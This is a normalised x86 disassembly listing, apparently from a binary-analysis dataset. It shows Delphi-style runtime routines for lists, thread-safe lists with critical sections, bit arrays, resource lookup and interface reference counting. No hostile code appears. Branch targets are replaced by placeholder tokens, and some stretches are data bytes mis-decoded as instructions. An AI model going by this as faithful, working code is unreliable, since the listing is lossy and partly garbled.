mov edx ebx
mov eax [ rw-data ]
call sub_416f34
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4177c5
mov eax [ rw-data ]
call sub_4172e8
retn
sub_417824
push ebp
mov ebp esp
test dl dl
je r-xdata
mov [ eax + 0x4 ] ecx
mov ecx [ ebp + 0xc ]
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax + 0xc ] ecx
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_403490
pop ebp
retn 0x8
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_41785c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_417824
mov edx eax
mov eax [ rw-data ]
call sub_4181d0
pop edi
pop esi
pop ebx
retn
sub_417888
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
call sub_418258
mov esi eax
xor edx edx
push ebp
push sub_4178f2
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_4182bc
retn
mov edx ebx
mov eax esi
call sub_417e94
cmp edi [ eax + 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax [ eax + 0x8 ]
mov [ ebp - 0x4 ] eax
call sub_4039a4
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_417904
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
xor eax eax
inc esi
lea ebx [ ecx + 0x4 ]
add ebx 0x8
dec esi
jne r-xdata
mov al 0x1
mov edx [ ebp - 0x4 ]
mov ecx [ ebx - 0x4 ]
mov [ edx ] ecx
jmp r-xdata
mov edx edi
mov eax [ ebx ]
call sub_407fec
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_417944
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
mov [ ebp - 0x5 ] 0x0
inc esi
mov ebx [ ebp - 0x4 ]
add ebx 0x8
dec esi
jne r-xdata
mov [ ebp - 0x5 ] 0x1
mov eax edi
mov edx [ ebx + 0x4 ]
call sub_403f94
jmp r-xdata
cmp eax [ ebx ]
jne r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_417988
push ebx
push esi
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
mov esi ebx
mov edx esi
mov eax [ rw-data ]
call sub_417ef0
test eax eax
jge r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40313c
mov [ rw-data ] eax
pop esi
pop ebx
retn
mov edx esi
mov eax [ rw-data ]
call sub_417d38
sub_4179e0
push ebx
push esi
push edi
mov esi eax
xor eax eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ rw-data ]
mov ebx [ edx + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_417e94
mov edi eax
mov eax esi
call edi
test eax eax
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_417a20
push ebx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax ebx
call sub_4179e0
test eax eax
sete al
pop ebx
retn
mov eax ebx
call [ rw-data ]
pop ebx
retn
sub_417a44
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
test ebx ebx
jne r-xdata
push 0xa
mov eax edi
call sub_404400
push eax
push ebx
call FindResourceA
test eax eax
setne al
test al al
je r-xdata
mov ebx [ rw-data ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
push edi
push 0xa
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_41ac50
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_417ab8
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ esi ]
mov eax [ ebp - 0x4 ]
call sub_41a750
mov [ esi ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_40316c
retn
sub_417ac8
push ebx
call sub_406000
mov ebx [ eax + 0xc ]
test ebx ebx
jne r-xdata
call sub_406000
mov edx [ eax + 0x8 ]
mov eax ebx
call sub_417d38
mov dl 0x1
mov eax [ r-xdata ]
call sub_40313c
mov ebx eax
call sub_406000
mov [ eax + 0x8 ] ebx
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_40313c
mov ebx eax
call sub_406000
mov [ eax + 0xc ] ebx
sub_417b20
push ebx
push esi
push edi
call sub_406000
mov edi [ eax + 0x8 ]
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_417e94
mov edx [ eax ]
call [ edx + 0xc ]
inc esi
dec ebx
jne r-xdata
sub_417b50
push ebx
push esi
call sub_406000
mov eax [ eax + 0x8 ]
call sub_40316c
call sub_406000
mov ebx [ eax + 0xc ]
mov eax ebx
call sub_417f7c
mov esi eax
call sub_406000
mov [ eax + 0x8 ] esi
mov edx [ ebx + 0x8 ]
dec edx
mov eax ebx
call sub_417d84
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
call sub_406000
xor edx edx
mov [ eax + 0xc ] edx
mov eax ebx
call sub_40316c
sub_417bac
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
xor edx edx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_417c42
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
cmp esi [ r-xdata ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417c49
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
mov eax [ ebp + 0x8 ]
cmp esi [ eax - 0x8 ]
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_4030f8
call sub_417bac
pop ecx
mov ebx eax
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_4030bc
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_4041a4
mov eax [ ebp - 0x4 ]
push eax
mov eax esi
call sub_4052b0
call sub_405300
mov edx eax
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x4 ]
pop eax
call sub_417a44
or bl al
sub_417c54
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_417d02
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x1c ]
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
sete [ ebp - 0xa ]
cmp [ ebp - 0xa ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_417ce3
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov eax [ ebp - 0x4 ]
call sub_4030b4
call sub_417bac
pop ecx
mov [ ebp - 0x9 ] al
cmp [ ebp - 0xa ] 0x0
je r-xdata
call sub_417ac8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417cea
cmp [ ebp - 0xa ] 0x0
je r-xdata
call sub_417b20
retn
call sub_417b50
sub_417d18
push ebx
push esi
call sub_4034f8
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034e0
sub_417d38
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x8 ]
cmp esi [ ebx + 0xc ]
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ eax + esi * 4 ] edi
inc [ ebx + 0x8 ]
test edi edi
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax esi
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_417d84
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_417e20
cmp esi [ ebx + 0x8 ]
jl r-xdata
test edi edi
je r-xdata
sub eax esi
mov ecx eax
shl ecx 0x2
mov eax [ ebx + 0x4 ]
lea edx [ eax + esi * 4 ]
mov eax [ ebx + 0x4 ]
lea eax [ eax + esi * 4 + 0x4 ]
call sub_4028d8
mov edx esi
mov eax ebx
call sub_417e94
mov edi eax
dec [ ebx + 0x8 ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jge r-xdata
pop edi
pop esi
pop ebx
retn
mov cl 0x2
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_417de8
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ebx edx
call sub_417de4
push eax
mov [ esp + 0x4 ] esi
mov [ esp + 0x8 ] 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x0
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba08
jmp sub_4038f8
sub_417e20
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi ecx
mov ebx edx
xor eax eax
push ebp
push sub_417e68
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_405d94
mov edx [ ebp - 0x4 ]
mov ecx esi
mov eax [ r-xdata ]
call sub_417de8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417e6f
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
sub_417e94
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_417e20
cmp esi [ ebx + 0x8 ]
jl r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + esi * 4 ]
pop esi
pop ebx
retn
sub_417ebc
mov edx [ eax + 0xc ]
cmp edx 0x40
jle r-xdata
cmp edx 0x8
jle r-xdata
mov ecx edx
test ecx ecx
jns r-xdata
mov ecx 0x4
mov ecx 0x10
jmp r-xdata
sar ecx 0x2
jmp r-xdata
add ecx 0x3
add ecx edx
mov edx ecx
call sub_418050
retn
sub_417ef0
push ebx
xor ecx ecx
jmp r-xdata
cmp ecx [ eax + 0x8 ]
jge r-xdata
cmp ecx [ eax + 0x8 ]
jne r-xdata
mov ebx [ eax + 0x4 ]
cmp edx [ ebx + ecx * 4 ]
jne r-xdata
mov eax ecx
pop ebx
retn
or ecx 0xffffffff
inc ecx
sub_417f10
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_417e20
cmp esi [ ebx + 0x8 ]
jle r-xdata
mov eax [ ebx + 0x8 ]
cmp esi eax
jge r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax [ ebx + 0x8 ]
cmp eax [ ebx + 0xc ]
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ eax + esi * 4 ] edi
inc [ ebx + 0x8 ]
test edi edi
je r-xdata
sub eax esi
mov ecx eax
shl ecx 0x2
mov eax [ ebx + 0x4 ]
lea edx [ eax + esi * 4 + 0x4 ]
mov eax [ ebx + 0x4 ]
lea eax [ eax + esi * 4 ]
call sub_4028d8
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_417f88
push ebx
push esi
push edi
push ebp
mov esi ecx
mov edi edx
mov ebx eax
cmp esi edi
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_417e20
cmp esi [ ebx + 0x8 ]
jl r-xdata
mov edx edi
mov eax ebx
call sub_417e94
mov ebp eax
mov eax [ ebx + 0x4 ]
xor edx edx
mov [ eax + edi * 4 ] edx
mov edx edi
mov eax ebx
call sub_417d84
xor ecx ecx
mov edx esi
mov eax ebx
call sub_417f10
mov eax [ ebx + 0x4 ]
mov [ eax + esi * 4 ] ebp
sub_417fe0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_417e20
cmp esi [ ebx + 0x8 ]
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov [ edx + esi * 4 ] edi
test eax eax
je r-xdata
mov edx [ ebx + 0x4 ]
mov eax [ edx + esi * 4 ]
cmp edi eax
je r-xdata
test edi edi
je r-xdata
mov cl 0x2
mov edx eax
mov eax ebx
mov esi [ eax ]
call [ esi + 0x4 ]
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_418030
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_417ef0
mov esi eax
test esi esi
jl r-xdata
mov eax esi
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_417d84
sub_418050
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x8 ]
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_417e20
cmp esi 0x7ffffff
jle r-xdata
pop esi
pop ebx
retn
mov edx esi
shl edx 0x2
lea eax [ ebx + 0x4 ]
call sub_40271c
mov [ ebx + 0xc ] esi
cmp esi [ ebx + 0xc ]
je r-xdata
sub_41808c
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_417e20
cmp esi 0x7ffffff
jle r-xdata
mov eax [ ebx + 0x8 ]
cmp esi eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_418050
cmp esi [ ebx + 0xc ]
jle r-xdata
mov ebp eax
dec ebp
mov edi esi
sub edi ebp
jg r-xdata
mov edx [ ebx + 0x4 ]
lea edx [ edx + eax * 4 ]
mov ecx esi
sub ecx eax
mov eax ecx
shl eax 0x2
xor ecx ecx
xchg edx eax
call sub_402b80
jmp r-xdata
mov [ ebx + 0x8 ] esi
pop ebp
pop edi
pop esi
pop ebx
retn
dec edi
mov edx ebp
mov eax ebx
call sub_417d84
dec ebp
inc edi
jne r-xdata
sub_418100
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_40313c
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov dl 0x1
mov eax [ r-xdata ]
call sub_40313c
mov [ esi + 0x4 ] eax
mov [ esi + 0x20 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403490
mov eax esi
pop esi
pop ebx
retn
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_418154
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_4034f8
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_418258
xor eax eax
push ebp
push sub_4181b6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_40316c
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_40315c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4181bd
mov eax [ ebp - 0x4 ]
call sub_4182bc
mov eax [ ebp - 0x4 ]
add eax 0x8
push eax
call DeleteCriticalSection
retn
sub_4181d0
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_418258
xor eax eax
push ebp
push sub_41824c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_417d38
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_417ef0
inc eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418253
mov eax [ ebp - 0x4 ]
call sub_4182bc
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x2
jne r-xdata
mov edx [ rw-data ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax ]
mov ecx ebx
call sub_417e20
sub_41826c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_418258
xor eax eax
push ebp
push sub_4182af
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_418030
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4182b6
mov eax [ ebp - 0x4 ]
call sub_4182bc
retn
sub_4182c8
push ebx
push esi
call sub_4034f8
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41831c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40315c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034e0
sub_41831c
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x4 ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
test esi esi
jge r-xdata
lea eax [ esi + 0x20 ]
dec eax
test eax eax
jns r-xdata
mov eax ebx
call sub_4182f8
sar eax 0x5
mov edi eax
shl edi 0x2
mov eax [ ebx + 0x4 ]
add eax 0x20
dec eax
test eax eax
jns r-xdata
add eax 0x1f
sar eax 0x5
mov ebp eax
shl ebp 0x2
cmp ebp edi
je r-xdata
add eax 0x1f
mov [ ebx + 0x4 ] esi
xor eax eax
mov [ esp ] eax
test edi edi
je r-xdata
test ebp ebp
je r-xdata
mov eax edi
call sub_4026dc
mov [ esp ] eax
mov eax [ esp ]
xor ecx ecx
mov edx edi
call sub_402b80
mov eax [ esp ]
mov [ ebx + 0x8 ] eax
cmp [ esp ] 0x0
je r-xdata
mov edx ebp
mov eax [ ebx + 0x8 ]
call sub_4026fc
mov edx edi
mov eax ebp
call sub_418310
mov ecx eax
mov edx [ esp ]
mov eax [ ebx + 0x8 ]
call sub_4028d8
sub_4183c0
cmp edx [ eax + 0x4 ]
jae r-xdata
cmp edx 0x0
jl sub_4182f8
mov eax [ eax + 0x8 ]
or cl cl
je r-xdata
push eax
push edx
push ecx
inc edx
call sub_41831c
pop ecx
pop edx
pop eax
jmp r-xdata
btr [ eax ] edx
retn
bts [ eax ] edx
retn
sub_418404
push ebx
push esi
push edi
push ecx
mov ebx eax
mov eax [ ebx + 0x4 ]
add eax 0x20
dec eax
test eax eax
jns r-xdata
sar eax 0x5
dec eax
test eax eax
jl r-xdata
add eax 0x1f
mov eax [ ebx + 0x4 ]
inc eax
mov [ esp ] eax
xor esi esi
inc esi
dec [ esp ]
jne r-xdata
mov eax [ ebx + 0x8 ]
mov edi [ eax + esi * 4 ]
xor eax eax
mov eax [ ebx + 0x8 ]
mov edx [ r-xdata ]
cmp edx [ eax + esi * 4 ]
je r-xdata
jb r-xdata
and edx 0x7f
bt edi edx
inc eax
cmp al 0x20
jne r-xdata
mov edx esi
shl edx 0x5
and eax 0x7f
add edx eax
mov eax edx
mov edx [ ebx + 0x4 ]
cmp eax edx
jl r-xdata
mov edx eax
cmp dl 0x1f
ja r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax edx
jmp r-xdata
sub_41847c
push ebx
push esi
call sub_4034f8
mov ebx edx
mov esi eax
mov eax esi
call sub_41b3f0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40315c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034e0
sub_4184bc
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_418572
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_403fd8
lea edx [ ebp - 0x104 ]
mov eax [ esi ]
call sub_4030bc
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_4041a4
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x114 ] eax
mov [ ebp - 0x110 ] 0xb
lea edx [ ebp - 0x104 ]
mov eax [ ebx ]
call sub_4030bc
lea eax [ ebp - 0x104 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0x4
lea eax [ ebp - 0x114 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bac4
call sub_4038f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418579
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
sub_418598
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_41862d
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x104 ]
mov eax [ ebx ]
call sub_4030bc
lea edx [ ebp - 0x104 ]
mov eax edi
call sub_4041a4
mov eax ebx
mov si 0xffff
call sub_403368
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418634
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
mov eax ebx
mov si 0xffff
call sub_403368
lea edx [ ebp - 0x4 ]
mov si 0xfffe
call sub_403368
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push [ ebp - 0x4 ]
push r-xdata
push [ edi ]
mov eax edi
mov edx 0x3
call sub_4042c0
sub_41863f
inc [ ecx ]
add [ eax ] al
add [ esi ] ch
add [ eax ] al
add [ ebx ] dh
rol bl 0x90
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_4033c0
mov eax ebx
mov si 0xffff
call sub_403368
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffff
call sub_403368
push eax
lea eax [ ebx + 0x4 ]
call sub_4058d0
mov ecx eax
mov edx r-xdata
pop eax
call sub_403220
sub_41868a
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
or eax 0xffffffff
mov eax [ eax + 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
jmp r-xdata
pop ebp
retn 0x4
sub_4186bc
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
or eax 0xffffffff
mov eax [ eax + 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
jmp r-xdata
pop ebp
retn 0x4
sub_4186dc
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_403220
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_418704
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov ebx eax
test edi edi
je r-xdata
mov eax edi
call sub_4058d0
test ebx ebx
je r-xdata
xor eax eax
mov [ edi ] eax
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax ebx
mov si 0xffff
call sub_403368
mov esi eax
test esi esi
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
mov eax edi
call sub_4058d0
mov edx eax
mov eax esi
call sub_418704
test [ ebx + 0x1c ] 0x10
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax edi
call sub_4058d0
push eax
push r-xdata
push ebx
mov eax [ ebx ]
call [ eax + 0x28 ]
jmp r-xdata
sub_41879c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
xor eax eax
push ebp
push sub_4187f1
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_4058d0
mov edx eax
mov eax edi
call sub_418704
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4187f8
lea eax [ ebp - 0x4 ]
call sub_4058d0
retn
mov ecx ebx
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
sub_418800
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov edx ecx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403490
mov eax esi
pop esi
pop ebx
retn
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_418838
push ebx
push esi
call sub_4034f8
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41847c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034e0
sub_418868
push esi
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
pop esi
retn
cmp [ esi + 0xc ] 0x0
jne r-xdata
test dl dl
je r-xdata
mov edx eax
xor edx edx
jmp r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x1c ]
sub_4188a4
push ebx
push esi
add esp 0xffffff00
mov esi edx
mov ebx eax
mov edx esp
mov eax [ ebx ]
call sub_4030bc
mov edx esp
mov eax esi
call sub_4041a4
add esp 0x100
pop esi
pop ebx
retn
sub_4188cc
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_418961
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x4 ] 0x0
je r-xdata
lea edx [ ebp - 0x114 ]
mov eax [ ebx ]
call sub_4030bc
lea edx [ ebp - 0x114 ]
mov eax edi
call sub_4041a4
push edi
lea edx [ ebp - 0x14 ]
mov eax [ ebx + 0x4 ]
mov si 0xfffe
call sub_403368
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
mov eax ebx
call sub_41888c
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
lea edx [ ebp - 0x10 ]
mov ecx 0x1
mov eax r-xdata
call sub_409118
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418968
lea eax [ ebp - 0x14 ]
call sub_403f40
retn
sub_41897f
add [ ebx + 0x53c30440 ] cl
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
call sub_418e54
mov edx ebx
mov eax esi
call sub_418dec
sub_4189b4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_41888c
test eax eax
jl r-xdata
pop esi
pop ebx
retn
cmp esi eax
je r-xdata
mov edx [ ebx + 0x4 ]
mov edx [ edx + 0x8 ]
mov ecx esi
xchg edx eax
call sub_417f88
mov dl 0x1
mov eax ebx
call sub_418868
sub_4189e4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x4 ] ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40313c
mov [ esi + 0x8 ] eax
xor ecx ecx
mov edx esi
mov eax esi
call sub_41879c
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403490
mov eax esi
pop esi
pop ebx
retn
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_418a30
push ebx
push esi
call sub_4034f8
mov ebx edx
mov esi eax
mov [ esi + 0xc ] 0x1
cmp [ esi + 0x8 ] 0x0
je r-xdata
mov cl 0x1
mov edx esi
mov eax esi
call sub_41879c
mov eax [ esi + 0x8 ]
call sub_40316c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41847c
test bl bl
jle r-xdata
mov eax esi
call sub_418b48
pop esi
pop ebx
retn
mov eax esi
call sub_4034e0
sub_418a7c
push ebx
push ecx
mov ebx eax
mov ecx ebx
mov dl 0x1
